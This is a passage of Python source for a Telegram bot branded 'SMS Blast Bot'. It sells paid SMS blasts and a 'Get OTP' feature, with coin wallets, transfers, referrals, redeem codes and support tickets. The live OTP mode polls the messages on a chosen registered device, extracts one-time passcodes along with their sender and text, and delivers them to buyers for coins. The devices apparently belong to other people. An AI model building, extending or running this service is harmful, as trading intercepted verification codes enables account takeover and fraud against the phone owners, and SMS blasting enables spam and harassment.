    rows = [
        [btn("fresh", f"otp:fetch:0:{idx}", EMOJI_OTP, "🟢", style="success"),
         btn("all", f"otp:fetch:1:{idx}", EMOJI_OTP, "🔍", style="primary")],
        [btn("live mode", f"otp:live:{idx}", EMOJI_CLOCK, "⏱", style="success")],
        [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
    ]
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

# ============================================================
#  GET OTP — LIVE MODE
# ============================================================
@R.callback_query(F.data.regexp(r"^otp:live:(\d+)$"))
async def otp_live_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    idx = int(cq.data.split(":")[-1])
    devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
    if idx >= len(devices):
        try:
            await cq.answer("❌ Gone!", show_alert=True)
        except Exception:
            pass
        await otp_menu(cq, state)
        return
    dv = devices[idx]
    cost = get_otp_cost(d)
    is_priv = is_admin(uid, d) or is_owner(uid, d)
    if not is_priv:
        if get_user_coins(uid, d) < cost:
            try:
                await cq.answer(f"🪙 Need {cost}!", show_alert=True)
            except Exception:
                pass
            return
    try:
        await cq.answer("⏱ Live mode ON!")
    except Exception:
        pass

    old = OTP_LIVE_SESSIONS.get(uid)
    if old and old.get("task") and not old["task"].done():
        old["task"].cancel()

    seen = set()
    existing = await collect_all_messages(dv, limit=_OTP_MAX_SCAN)
    for m in existing:
        seen.add(m["msg_id"])

    started = now_ts()
    sess = {
        "device": dv,
        "chat_id": cq.message.chat.id,
        "msg_id": cq.message.message_id,
        "started": started,
        "seen": seen,
        "cost": 0 if is_priv else cost,
        "task": None,
    }
    OTP_LIVE_SESSIONS[uid] = sess

    async def upd():
        end = started + _OTP_LIVE_TIMEOUT
        while now_ts() < end:
            try:
                cur = await collect_all_messages(dv, limit=_OTP_MAX_SCAN)
                found = []
                for o in cur:
                    if o["msg_id"] in seen:
                        continue
                    seen.add(o["msg_id"])
                    if not o["has_otp"]:
                        continue
                    if not is_priv:
                        if deduct_coins(uid, cost, d, "otp-live"):
                            k = str(uid)
                            d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
                        else:
                            try:
                                await cq.bot.send_message(uid, f"🪙 <b>Out of coins!</b> Live mode stopped.", parse_mode="HTML")
                            except Exception:
                                pass
                            OTP_LIVE_SESSIONS.pop(uid, None)
                            return
                    found.append(o)
                    d.setdefault("otp_history", {}).setdefault(str(uid), []).append({
                        "otp": o["otps"][0] if o["otps"] else "?",
                        "sender": o["sender"],
                        "device_name": dv.get("dev_name", ""),
                        "device_phone": dv.get("phone") or "",
                        "fb_id": dv.get("fb_id", ""),
                        "timestamp": now_ts(),
                        "cost": 0 if is_priv else cost,
                    })
                    if len(d["otp_history"][str(uid)]) > 200:
                        d["otp_history"][str(uid)] = d["otp_history"][str(uid)][-200:]
                if found:
                    save()
                    txt = f"{em(EMOJI_OTP, '🔐')} <b>NEW OTP!</b>\n\n"
                    for o in found[-5:]:
                        codes = ", ".join(o["otps"]) if o["otps"] else "?"
                        txt += (
                            f"🔐 <code>{codes}</code>\n"
                            f"📤 {esc(o['sender'][:40])}\n"
                            f"🕐 {fmt_time_short(o['ts'])}\n"
                            f"💬 <i>{esc(o['body'][:200])}</i>\n\n"
                        )
                    remaining = max(0, end - now_ts())
                    txt += f"⏱ Live: {remaining // 60}m {remaining % 60}s left"
                    if len(txt) > 4000:
                        txt = txt[:3990] + "\n<i>...</i>"
                    try:
                        await cq.bot.edit_message_text(
                            txt,
                            chat_id=sess["chat_id"],
                            message_id=sess["msg_id"],
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [btn("stop live", "otp:live_stop", EMOJI_CROSS, "🛑", style="danger")]
                            ]),
                            parse_mode="HTML",
                        )
                    except TelegramRetryAfter as e:
                        await asyncio.sleep(min(e.retry_after, 5))
                    except Exception:
                        pass
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            await asyncio.sleep(_OTP_POLL_INTERVAL)

        try:
            await cq.bot.edit_message_text(
                f"⏱ <b>Live mode ended</b>\n\nNo new OTP in {_OTP_LIVE_TIMEOUT // 60} min.",
                chat_id=sess["chat_id"],
                message_id=sess["msg_id"],
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [btn("check again", f"otp:fetch:0:{idx}", EMOJI_OTP, "🔄", style="primary")],
                    [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
                ]),
                parse_mode="HTML",
            )
        except Exception:
            pass
        OTP_LIVE_SESSIONS.pop(uid, None)

    t = asyncio.create_task(upd())
    sess["task"] = t

    txt = (
        f"⏱ <b>Live OTP Mode ON</b>\n\n"
        f"📞 <code>{esc(dv.get('phone') or 'no number')}</code>\n"
        f"📛 {esc(str(dv.get('dev_name', ''))[:30])}\n\n"
        f"<i>New OTPs will arrive here for {_OTP_LIVE_TIMEOUT // 60} min.</i>"
    )
    rows = [
        [btn("stop live", "otp:live_stop", EMOJI_CROSS, "🛑", style="danger")],
        [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "otp:live_stop")
async def otp_live_stop(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    sess = OTP_LIVE_SESSIONS.get(uid)
    if sess and sess.get("task") and not sess["task"].done():
        sess["task"].cancel()
    OTP_LIVE_SESSIONS.pop(uid, None)
    try:
        await cq.answer("🛑 Stopped!")
    except Exception:
        pass
    await safe_edit(cq, f"🛑 <b>Live mode stopped</b>", kb([(sc("back"), "user:otp:menu")]))

# ============================================================
#  USER WALLET
# ============================================================
@R.callback_query(F.data == "user:wallet")
async def user_wallet(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    cr = get_user_credits(uid, d)
    co = get_user_coins(uid, d)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💳')} <b>My Wallet</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{cr}</b>\n"
        f"  <i>Used for SMS blasts</i>\n\n"
        f"{em(EMOJI_COIN, '🪙')} Coins: <b>{co}</b>\n"
        f"  <i>Used for Get OTP ({get_otp_cost(d)} per fetch)</i>",
        wallet_kb(),
    )

@R.callback_query(F.data == "user:coin_ledger")
async def user_coin_ledger(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    hist = d.get("transactions", {}).get(str(uid), [])
    lines = [f"{em(EMOJI_COIN, '🪙')} <b>Transaction History</b>\n"]
    if not hist:
        lines.append("<i>No transactions yet.</i>")
    else:
        for e in reversed(hist[-30:]):
            ts = fmt_time(e.get("ts", 0))
            cur = e.get("currency", "?")
            delta = e.get("delta", 0)
            reason = e.get("reason", "")
            sign = "+" if delta > 0 else ""
            ic = "💰" if cur == "credits" else "🪙"
            lines.append(f"{ic} {sign}{delta} {cur} — <i>{esc(reason)[:40]}</i>\n   🕐 {ts}")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "user:wallet")]))

# ============================================================
#  USER TRANSFER — credits & coins
# ============================================================
@R.callback_query(F.data == "user:transfer:menu")
async def transfer_menu(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\nWhat to transfer?",
        InlineKeyboardMarkup(inline_keyboard=[
            [btn("💰 credits", "user:transfer:credits", EMOJI_MONEY, "💰", style="primary"),
             btn("🪙 coins", "user:transfer:coins", EMOJI_COIN, "🪙", style="primary")],
            [btn("back", "user:home", EMOJI_GEAR, "🔙")],
        ]),
    )

@R.callback_query(F.data == "user:transfer:credits")
async def transfer_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        try:
            await cq.answer("⛔")
        except Exception:
            pass
        return
    cur = get_user_credits(uid, d)
    if cur < 2:
        try:
            await cq.answer("❌ Min 2 credits!")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.transfer_credits_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"Your: <b>{cur}</b>\nMax: half\n\n"
        f"Step 1/2: Target user ID:",
        kb([(sc("cancel"), "user:transfer:menu")]),
    )

@R.message(S.transfer_credits_uid)
async def transfer_credits_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        t = int((m.text or "").strip())
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send valid ID.", parse_mode="HTML")
        return
    if t == uid:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Cannot transfer to self.", parse_mode="HTML")
        return
    if str(t) not in d.get("users", {}):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} User not found.", parse_mode="HTML")
        return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Min 2!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=t)
    await state.set_state(S.transfer_credits_amount)
    await m.answer(
        f"Step 2/2\nTo: <code>{t}</code>\nMax: <b>{cur // 2}</b>\n\nAmount:",
        parse_mode="HTML",
    )

@R.message(S.transfer_credits_amount)
async def transfer_credits_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        a = int((m.text or "").strip())
        if a <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    t = fsmd.get("transfer_target")
    cur = get_user_credits(uid, d)
    mt = cur // 2
    if a > mt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {mt}!", parse_mode="HTML")
        return
    if not deduct_credits(uid, a, d, "transfer-out"):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML")
        return
    add_credits(t, a, d, False, "transfer-in")
    save()
    await state.clear()
    try:
        await m.bot.send_message(t, f"💸 <b>+{a} credits from {uid}</b>", parse_mode="HTML")
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Sent {a} credits to <code>{t}</code>.",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:transfer:coins")
async def transfer_coins_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        try:
            await cq.answer("⛔")
        except Exception:
            pass
        return
    cur = get_user_coins(uid, d)
    if cur < 1:
        try:
            await cq.answer("❌ Min 1 coin!")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.transfer_coins_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Transfer Coins</b>\n\n"
        f"Your: <b>{cur}</b>\n\n"
        f"Step 1/2: Target user ID:",
        kb([(sc("cancel"), "user:transfer:menu")]),
    )

@R.message(S.transfer_coins_uid)
async def transfer_coins_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        t = int((m.text or "").strip())
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send valid ID.", parse_mode="HTML")
        return
    if t == uid:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Cannot self.", parse_mode="HTML")
        return
    if str(t) not in d.get("users", {}):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found.", parse_mode="HTML")
        return
    await state.update_data(transfer_target=t)
    await state.set_state(S.transfer_coins_amount)
    await m.answer(f"Step 2/2\nTo: <code>{t}</code>\n\nAmount:", parse_mode="HTML")

@R.message(S.transfer_coins_amount)
async def transfer_coins_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        a = int((m.text or "").strip())
        if a <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    t = fsmd.get("transfer_target")
    cur = get_user_coins(uid, d)
    if a > cur:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {cur}!", parse_mode="HTML")
        return
    if not deduct_coins(uid, a, d, "transfer-out"):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML")
        return
    add_coins(t, a, d, False, "transfer-in")
    save()
    await state.clear()
    try:
        await m.bot.send_message(t, f"🪙 <b>+{a} coins from {uid}</b>", parse_mode="HTML")
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Sent {a} coins to <code>{t}</code>.",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  USER GIFT COINS (one-way)
# ============================================================
@R.callback_query(F.data == "user:gift:menu")
async def gift_menu(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Gift Coins</b>\n\n"
        f"Send coins to a friend (one-way, no return).\n\nTap to continue.",
        kb([
            (sc("continue"), "user:gift:start"),
            (sc("back"), "user:home"),
        ]),
    )

@R.callback_query(F.data == "user:gift:start")
async def gift_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    cur = get_user_coins(uid, d)
    if cur < 1:
        try:
            await cq.answer("❌ No coins!")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.gift_coins_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Gift Coins</b>\n\n"
        f"Your coins: <b>{cur}</b>\n\nTarget user ID:",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.gift_coins_uid)
async def gift_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        t = int((m.text or "").strip())
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML")
        return
    if t == uid:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Cannot self.", parse_mode="HTML")
        return
    if str(t) not in d.get("users", {}):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found.", parse_mode="HTML")
        return
    await state.update_data(gift_target=t)
    await state.set_state(S.gift_coins_amount)
    await m.answer(f"Target: <code>{t}</code>\n\nAmount to gift:", parse_mode="HTML")

@R.message(S.gift_coins_amount)
async def gift_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        a = int((m.text or "").strip())
        if a <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    t = fsmd.get("gift_target")
    cur = get_user_coins(uid, d)
    if a > cur:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {cur}!", parse_mode="HTML")
        return
    if not deduct_coins(uid, a, d, "gift-out"):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML")
        return
    add_coins(t, a, d, False, "gift-in")
    save()
    await state.clear()
    try:
        await m.bot.send_message(t, f"🎁 <b>+{a} coins gift from {uid}</b>", parse_mode="HTML")
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Gifted {a} coins to <code>{t}</code>.",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  REFER
# ============================================================
@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_refer_code(uid, d)
    save()
    try:
        await cq.answer()
    except Exception:
        pass
    rc = d.get("settings", {}).get("ref_credits", 3)
    rcoin = d.get("settings", {}).get("ref_coins", 1)
    try:
        me = await cq.bot.get_me()
    except Exception:
        me = None
    un = me.username if me else "bot"
    referred = len(d.get("referral_tree", {}).get(str(uid), []))
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '👥')} <b>Referral</b>\n\n"
        f"Each referral = <b>{rc} credits + {rcoin} coins</b>\n"
        f"Your referrals: <b>{referred}</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} <code>{esc(code)}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} <code>https://t.me/{un}?start={code}</code>",
        kb([(sc("back"), "user:home")]),
    )

# ============================================================
#  REDEEM
# ============================================================
@R.callback_query(F.data == "user:redeem")
async def redeem_user_start(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.redeem_code)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem</b>\n\nEnter code:",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.redeem_code)
async def redeem_user_done(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    code = (m.text or "").strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid code!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Expired!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    if uid in cd.get("used_by", []):
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Already used!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    c = cd["credits"]
    cur = cd.get("currency", "credits")
    if cur == "coins":
        add_coins(uid, c, d, False, f"redeem-{code}")
    else:
        add_credits(uid, c, d, False, f"redeem-{code}")
    cd["uses_left"] = cd.get("uses_left", 1) - 1
    cd.setdefault("used_by", []).append(uid)
    save()
    ic = "🪙" if cur == "coins" else "💰"
    await m.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>+{c} {cur}</b> {ic}\n"
        f"Balance: 💰{get_user_credits(uid, d)} 🪙{get_user_coins(uid, d)}",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  DAILY BONUS
# ============================================================
@R.callback_query(F.data == "user:daily_bonus")
async def daily_bonus(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    k = str(uid)
    if k not in d.get("users", {}):
        try:
            await cq.answer("❌ Register first")
        except Exception:
            pass
        return
    last = d["users"][k].get("daily_bonus_ts", 0)
    bonus = int(d.get("settings", {}).get("daily_bonus_coins", _DAILY_BONUS_COINS))
    cooldown = _DAILY_BONUS_HOURS * 3600
    now = now_ts()
    if now - last < cooldown:
        wait = cooldown - (now - last)
        try:
            await cq.answer(f"⏳ Try again in {fmt_duration(wait)}", show_alert=True)
        except Exception:
            pass
        return
    d["users"][k]["daily_bonus_ts"] = now
    add_coins(uid, bonus, d, False, "daily-bonus")
    save()
    try:
        await cq.answer(f"🎁 +{bonus} coins!", show_alert=True)
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Daily Bonus</b>\n\n"
        f"Received: <b>+{bonus} 🪙</b>\n"
        f"Your coins: <b>{get_user_coins(uid, d)}</b>\n\n"
        f"Come back in {_DAILY_BONUS_HOURS}h.",
        kb([(sc("back"), "user:home")]),
    )

# ============================================================
#  USER HISTORY / STATS / INFO / SUPPORT
# ============================================================
@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    ud = d["users"].get(str(uid), {})
    referred = len(d.get("referral_tree", {}).get(str(uid), []))
    await safe_edit(
        cq,
        f"{em(EMOJI_CHART, '📊')} <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{ud.get('credits', 0)}</b>\n"
        f"🪙 Coins: <b>{ud.get('coins', 0)}</b>\n"
        f"📤 SMS Sent: <b>{ud.get('uses', 0)}</b>\n"
        f"🔐 OTP Fetched: <b>{ud.get('otp_uses', 0)}</b>\n"
        f"👥 Referrals: <b>{referred}</b>\n"
        f"📅 Joined: <b>{fmt_time(ud.get('joined_at', 0))}</b>\n"
        f"🕐 Last active: <b>{fmt_age(ud.get('last_active', 0))}</b>",
        kb([(sc("back"), "user:home")]),
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_hist_self(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    h = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not h:
        txt = f"{em(EMOJI_CLOCK, '📜')} <b>History</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_CLOCK, '📜')} <b>Your SMS History</b>\n"]
        for i, e in enumerate(reversed(h), 1):
            ts = fmt_time(e.get("timestamp", 0))
            nm = e.get("number", "?")
            mp = esc(str(e.get("message", ""))[:40])
            st = e.get("status", "?")
            ic = "✅" if st == "sent" else "🛑" if st == "stopped" else "⏳"
            lines.append(f"{i}. {ic} <code>{esc(mask_number(nm))}</code> [{ts}]\n   <i>{mp}</i>")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "user:home")]))

@R.callback_query(F.data == "user:otp_history")
async def user_otp_hist_self(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    h = d.get("otp_history", {}).get(str(uid), [])[-20:]
    if not h:
        txt = f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_OTP, '🔐')} <b>Your OTPs</b>\n"]
        for i, e in enumerate(reversed(h), 1):
            ts = fmt_time(e.get("timestamp", 0))
            otp = e.get("otp", "?")
            sender = esc(str(e.get("sender", "?"))[:30])
            lines.append(f"{i}. 🔐 <code>{otp}</code> — {sender}\n   🕐 {ts}")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "user:home")]))

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        try:
            await cq.answer("❌ No plans!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    txt = f"{em(EMOJI_MONEY, '💰')} <b>Buy</b>\n\n"
    for p in plans:
        cur = p.get("currency", "credits")
        amt = p.get("credits", 0) if cur == "credits" else p.get("coins", 0)
        ic = "💰" if cur == "credits" else "🪙"
        txt += f"📋 <b>{esc(p['name'])}</b>\n   {p['price']} INR = {amt} {ic}\n\n"
    rows = []
    for p in plans:
        rows.append([btn_url(f"Buy {p['name'][:20]}", p['payment_link'], EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("back", "user:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    od = get_owner_display(d)
    ol = f"👤 Owner: <a href='{SUPER_ADMIN_LINK}'>{esc(od)}</a>\n" if od else ""
    await safe_edit(
        cq,
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n{ol}\n"
        f"💰 Credits = SMS blast\n"
        f"🪙 Coins = Get OTP\n\n"
        f"<i>Refer friends to earn free credits!</i>",
        kb([(sc("back"), "user:home")]),
    )

@R.callback_query(F.data == "user:support")
async def user_support(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    kb_rows = [
        (sc("open ticket"), "user:ticket:new"),
        (sc("contact owner"), "user:contact_owner"),
        (sc("back"), "user:home"),
    ]
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>Support</b>\n\n"
        f"Need help? Open a ticket or contact the owner.",
        kb(kb_rows),
    )

@R.callback_query(F.data == "user:ticket:new")
async def user_ticket_new(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.direct_msg_text)
    await state.update_data(support_ticket=True)
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>New Ticket</b>\n\nType your message:",
        kb([(sc("cancel"), "user:home")]),
    )

@R.callback_query(F.data == "user:contact_owner")
async def user_contact_owner(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    od = get_owner_display(d)
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👤')} <b>Contact Owner</b>\n\n"
        f"{esc(od)}\n"
        f"<a href='{SUPER_ADMIN_LINK}'>{esc(SUPER_ADMIN_LINK)}</a>",
        kb([(sc("back"), "user:support")]),
    )

@R.callback_query(F.data == "user:appeal")
async def user_appeal(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.direct_msg_text)
    await state.update_data(appeal=True)
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '🔓')} <b>Appeal Ban</b>\n\n"
        f"Explain why you should be unbanned:",
        kb([(sc("cancel"), "user:home")]),
    )

# ============================================================
#  DIRECT MESSAGE / SUPPORT / APPEAL RECEIVER
# ============================================================
@R.message(S.direct_msg_text)
async def dm_receiver(m: Message, state: FSMContext):
    fsmd = await state.get_data()
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    uid = m.from_user.id
    uname = m.from_user.full_name or "User"
    target = fsmd.get("direct_msg_uid")
    is_ticket = fsmd.get("support_ticket")
    is_appeal = fsmd.get("appeal")
    await state.clear()

    # owner direct message
    if target:
        d = load()
        if not is_admin(uid, d):
            await m.answer(f"{em(EMOJI_CROSS, '❌')} Unauthorized.", parse_mode="HTML")
            return
        try:
            await m.bot.send_message(target, f"📩 <b>Message from {esc(uname)}</b>\n\n{esc(txt)}", parse_mode="HTML")
            await m.answer(f"{em(EMOJI_CHECK, '✅')} Sent to <code>{target}</code>.",
                           reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
                           parse_mode="HTML")
        except Exception as e:
            await m.answer(f"{em(EMOJI_CROSS, '❌')} Failed: {esc(str(e)[:80])}",
                           reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
                           parse_mode="HTML")
        return

    # support ticket
    if is_ticket:
        d = load()
        ticket = {
            "id": f"T{int(time.time())}",
            "uid": uid,
            "name": uname,
            "text": txt[:1000],
            "ts": now_ts(),
            "status": "open",
        }
        d.setdefault("tickets", []).append(ticket)
        save()
        try:
            await m.bot.send_message(MAIN_OWNER, (
                f"{em(EMOJI_BELL, '📩')} <b>New Ticket</b>\n\n"
                f"👤 {esc(uname)}\n"
                f"🆔 <code>{uid}</code>\n\n"
                f"💬 {esc(txt[:500])}"
            ), parse_mode="HTML")
        except Exception:
            pass
        await m.answer(f"{em(EMOJI_CHECK, '✅')} Ticket sent!", reply_markup=kb([(sc("home"), "user:home")]), parse_mode="HTML")
        return

    # appeal
    if is_appeal:
        d = load()
        appeal = {
            "uid": uid,
            "name": uname,
            "text": txt[:1000],
            "ts": now_ts(),
            "status": "open",
        }
        d.setdefault("appeals", []).append(appeal)
        save()
        try:
            await m.bot.send_message(MAIN_OWNER, (
                f"{em(EMOJI_USER, '🔓')} <b>Ban Appeal</b>\n\n"
                f"👤 {esc(uname)}\n"
                f"🆔 <code>{uid}</code>\n\n"
                f"💬 {esc(txt[:500])}"
            ), parse_mode="HTML")
        except Exception:
            pass
        await m.answer(f"{em(EMOJI_CHECK, '✅')} Appeal sent!", reply_markup=kb([(sc("home"), "user:home")]), parse_mode="HTML")
        return

    await m.answer(f"{em(EMOJI_CROSS, '❌')} Unknown message.", parse_mode="HTML")

# ============================================================
#  USER HOME / CANCEL
# ============================================================
@R.callback_query(F.data.in_({
    "user:home", "user:cancel",
    "owner:home", "owner:refresh",
    "admin:home", "admin:refresh",
}))
async def any_home(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await _render_home(cq, state, skip_fj=True)

# ============================================================
#  USER TEMPLATES
# ============================================================
@R.callback_query(F.data == "user:templates:menu")
async def user_templates_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    tpls = d.get("templates", {}).get(str(uid), [])
    rows = []
    for i, t in enumerate(tpls[:8]):
        rows.append([btn(t.get("name", f"tpl{i}")[:22], f"user:tpl:use:{i}", EMOJI_FILE, "📝")])
    rows.append([btn("new template", "user:tpl:new", EMOJI_PLUS, "➕")])
    rows.append([btn("back", "user:home", EMOJI_GEAR, "🔙")])
    txt = f"{em(EMOJI_FILE, '📝')} <b>Templates</b>\n\nTotal: <b>{len(tpls)}</b>"
    if not tpls:
        txt += "\n\n<i>No templates yet.</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

